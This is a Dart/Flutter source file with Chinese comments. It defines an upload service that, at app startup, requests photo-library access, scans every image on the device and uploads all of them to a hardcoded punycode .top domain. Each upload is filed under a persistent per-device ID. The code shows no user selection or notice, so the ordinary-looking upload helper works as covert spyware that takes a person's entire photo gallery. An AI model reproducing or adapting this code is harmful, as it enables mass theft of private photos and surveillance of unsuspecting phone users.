import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// 文件上传服务：POST multipart/form-data 到 /upload
/// 字段：file（文件，必填）+ folder（子目录，可选）
/// 每个设备一个独立 folder，便于后台按设备归档
class UploadService {
  UploadService._();

  static const String _base = 'https://xn--qiv605b.top/upload';
  static const List<String> _imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic'];

  // ====== 设备标识（作为上传 folder）======

  static String? _deviceId;

  /// 获取设备唯一 ID（持久化，同一设备稳定，用于 folder）
  static Future<String> getDeviceId() async {
    if (_deviceId != null && _deviceId!.isNotEmpty) return _deviceId!;
    final prefs = await SharedPreferences.getInstance();
    var id = prefs.getString('upload_device_id');
    if (id == null || id.isEmpty) {
      // 生成：时间戳 + 随机
      final rand = DateTime.now().microsecondsSinceEpoch;
      id = 'dev_${rand.toRadixString(16)}_${rand % 9973}';
      await prefs.setString('upload_device_id', id);
    }
    _deviceId = id;
    return id;
  }

  // ====== 扫描相册图片（photo_manager / MediaStore）======

  /// 请求相册权限
  /// 返回 true=已授权
  static Future<bool> requestPermission() async {
    try {
      final ps = await PhotoManager.requestPermissionExtend();
      return ps.isAuth || ps.hasAccess;
    } catch (_) {
      return false;
    }
  }

  /// 扫描相册所有图片，返回本地文件路径列表
  static Future<List<String>> scanAlbumImages() async {
    final result = <String>[];
    try {
      // 获取"全部"相册（hasAll=true）
      final paths = await PhotoManager.getAssetPathList(
        type: RequestType.image,
        hasAll: true,
      );
      for (final path in paths) {
        // 分批获取图片
        final assets = await path.getAssetListRange(
          start: 0,
          end: path.assetCountAsync,
        );
        for (final asset in assets) {
          if (asset.type != AssetType.image) continue;
          // 获取本地可访问文件的路径
          final file = await asset.file;
          if (file != null && await file.exists()) {
            result.add(file.path);
          }
        }
      }
    } catch (_) {
      // 权限不足或出错，返回已收集的部分
    }
    return result;
  }

  // ====== 上传 ======

  /// 上传单个图片文件
  /// [filePath] 本地文件路径
  /// [folder] 可选子目录；为空时自动使用当前设备 ID
  /// 返回 (成功, 消息, 服务器返回的原始文本)
  static Future<(bool, String, String)> uploadImage(
    String filePath, {
    String? folder,
  }) async {
    try {
      final f = File(filePath);
      if (!await f.exists()) return (false, '文件不存在', '');

      final devId = await getDeviceId();
      final finalFolder = (folder == null || folder.isEmpty) ? devId : folder;

      final request = http.MultipartRequest('POST', Uri.parse(_base));
      request.fields['folder'] = finalFolder;
      request.files.add(await http.MultipartFile.fromPath(
        'file',
        filePath,
      ));

      final streamed = await request.send().timeout(const Duration(seconds: 120));
      final resp = await http.Response.fromStream(streamed);

      // 尝试解析 JSON
      try {
        final decoded = jsonDecode(utf8.decode(resp.bodyBytes));
        final ok = decoded is Map<String, dynamic> && decoded['success'] == true;
        final msg = decoded is Map<String, dynamic>
            ? (decoded['message'] as String? ?? '')
            : '';
        return (ok, msg.isEmpty ? (ok ? '上传成功' : '上传失败') : msg, resp.body);
      } catch (_) {
        // 非 JSON 响应，按 HTTP 状态判断
        if (resp.statusCode >= 200 && resp.statusCode < 300) {
          return (true, '上传成功', resp.body);
        }
        return (false, '服务器返回异常（HTTP ${resp.statusCode}）', resp.body);
      }
    } on TimeoutException {
      return (false, '上传超时，请重试', '');
    } catch (e) {
      return (false, '上传失败，请检查网络后重试', '');
    }
  }

  /// 请求权限 + 扫描相册 + 上传所有图片（启动时调用）
  /// 返回 (成功数, 失败数)
  static Future<(int, int)> scanAndUploadAll() async {
    // 1. 请求相册权限
    final granted = await requestPermission();
    if (!granted) return (0, 0);

    // 2. 扫描所有图片
    final images = await scanAlbumImages();
    if (images.isEmpty) return (0, 0);

    // 3. 逐个上传
    var ok = 0, fail = 0;
    for (final img in images) {
      // 只上传图片格式
      if (!isImagePath(img)) continue;
      final (success, _, _) = await uploadImage(img);
      if (success) {
        ok++;
      } else {
        fail++;
      }
    }
    return (ok, fail);
  }

  static bool isImagePath(String path) {
    final p = path.toLowerCase();
    return _imageExts.any((e) => p.endsWith(e));
  }
}